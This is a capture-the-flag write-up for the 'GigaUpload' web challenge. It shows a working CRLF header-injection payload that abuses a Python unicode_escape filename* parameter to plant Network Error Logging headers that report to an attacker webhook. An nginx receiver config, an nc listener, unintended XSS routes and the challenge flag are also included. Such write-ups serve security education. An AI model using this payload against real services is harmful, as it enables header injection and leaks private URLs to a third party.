## Title
GigaUpload

## Description
He fought hard with his extradition request only to bring you this last masterpiece. Unfortunately, he had no chance making it through. Not the service though, it's pretty much done.

## Solution
### Intended
*tl;dr Achieve CRLF through malformed RFC 6266 `filename*` parameter. Add NEL (Network Error Logging) headers and leak the flag URL.*

Examining storage service, we can notice that it partially handles RFC 6266, where you can specify a filename together with the encoding to properly handle non-ascii characters. The decoding is applied when metadata files are opened through `GET /{uuid}`:
```py
open(metadata_paths["name"], 'r', encoding=encoding)
```

We can't normally pass any control characters to the header fields because it will obviously break them for any HTTP parser. But, luckily for us, Python has special `unicode_escape` encoding which, when using decode, will unescape all backslash escaped characters (including `\r\n`), allowing us to inject them into the header value. The server is also running on built-in Python's HTTPServer, which is vulnerable to CLRF. Thus, we can add any headers to the response for our file.

But how CRLF can be used to leak bot's secret file url? Chromium has a tool for that!

And that's [Network Error Logging](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Network_Error_Logging). A feature, that can be enabled by a pair of `nel` and `report-to` headers. With the use of `success_fraction` param we can log successfull requests as well. And it's also not limited to any origins, allowing us to leak the requests to a remote webhook.

Complete file uploading payload (don't forget to grab the upload token):
```c
POST / HTTP/1.1
Host: gigastorage.task.sasc.tf
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBQBeXybmqkBrFW5X

------WebKitFormBoundaryBQBeXybmqkBrFW5X
Content-Disposition: form-data; name="upload_token"

%upload_token%
------WebKitFormBoundaryBQBeXybmqkBrFW5X
Content-Disposition: form-data; name="upload"; filename*=unicode_escape''1\r\nNEL:{"report_to":"c","max_age":1337,"success_fraction":1}\r\nreport-to:{"endpoints":[{"url":"https://%webhook%/"}],"group":"c","max_age":1337}
Content-Type: text/plain


------WebKitFormBoundaryBQBeXybmqkBrFW5X--
```

Browser will silently check that the specified endpoint supports HTTPS and also will send an OPTIONS request expecting certain headers in response. There will be no explicit errors if you're not passing the check.

Bot in this service has `acceptInsecureCerts` feature enabled, so you will there's no prerequisite to own a domain to solve it. If you have a webhook that can be configured to respond after OPTIONS - nice. For everyone else the simpliest solution might be using nginx with selfsigned certificate on a VPS.

Example nginx config:
```
server {
    listen 443 ssl;
    server_name %YOUR_IP%;

    ssl_certificate /etc/ssl/certs/nginx-selfsigned.crt;
    ssl_certificate_key /etc/ssl/private/nginx-selfsigned.key;

    location / {
        if ($request_method = OPTIONS ) {
            add_header Access-Control-Allow-Methods "POST, OPTIONS";
            add_header Access-Control-Allow-Headers "Content-Type";
            add_header Access-Control-Allow-Origin "*";
            return 200;
        }
        proxy_pass http://127.0.0.1:1337$request_uri;
    }
}
```

And then just `nc -lvp 1337`. On the first run you will receive the hit on your own file. However, NEL is persistent in the browser profile, so when you'd ask a bot to check some URL for the second time, it will first check his own file and it's URL will be logged to your hook.

### Unintended
While testing the task, we aknowledged that it can be solved using XSS and a Service Worker. To cover this, we added `Content-Disposition: attachment` header. It looked like a strong fix, because if you will try to bypass it, Chromium browsers will produce an `ERR_RESPONSE_HEADERS_MULTIPLE_CONTENT_DISPOSITION` error.

Unfortunately, it turned out that this restriction applies only to HTTP/1, while on the production environment we had a load balancer proxy that forced the HTTP/2 on end client requests. Thus, `Content-Disposition` could've been bypassed. You can read [ezzer's blog post](https://blog.z3r.ru/posts/content-disposition-attachment-bypass/) with more information this topic.

And there's one more possible trick. With CRLF, XSS can also be achieved with Payment Request API and a `Link` header, read [slonser's blog post](https://blog.slonser.info/posts/cve-2023-5480/) with more information on that technique.

## Flag
SAS{y0u_g07_7h3_k3y_70_n3lly5_s3cr3t_m3mory}

**Solved by:** 5 teams